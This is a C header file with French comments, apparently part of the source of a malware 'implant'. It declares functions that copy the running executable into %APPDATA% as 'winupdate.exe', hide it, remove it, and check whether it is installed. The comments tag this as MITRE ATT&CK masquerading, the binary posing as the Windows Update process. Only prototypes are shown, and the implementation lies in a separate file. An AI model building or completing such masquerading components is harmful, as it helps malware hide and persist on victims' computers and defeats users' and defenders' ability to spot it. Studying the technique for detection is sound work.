#ifndef MASQUERADE_H
#define MASQUERADE_H

/*
 * masquerade.h — Copie de l'implant vers %APPDATA% sous un nom systeme
 * (winupdate.exe) avec attribut cache.
 *
 * MITRE ATT&CK : T1036.003 — Masquerading: Rename System Utilities
 *                (le binaire se fait passer pour un processus Windows
 *                 legitime, ici l'updater Windows Update)
 *
 * Renvoie 0 si OK, -1 sinon. Voir masquerade.c pour les details.
 */

#include <stddef.h>

/* Ecrit dans buf le chemin de la copie (%APPDATA%\winupdate.exe).
 * 0 si OK, -1 si chemin introuvable/buf trop petit. */
int masquerade_dest_path(char *buf, size_t buf_sz);

/* Copie l'exe courant vers ce chemin + attribut cache */
int masquerade_install(void);

/* Retire la copie (idempotent : rien a faire si absente) */
int masquerade_remove(void);

/* 1 si la copie existe, 0 sinon */
int masquerade_is_installed(void);

#endif /* MASQUERADE_H */
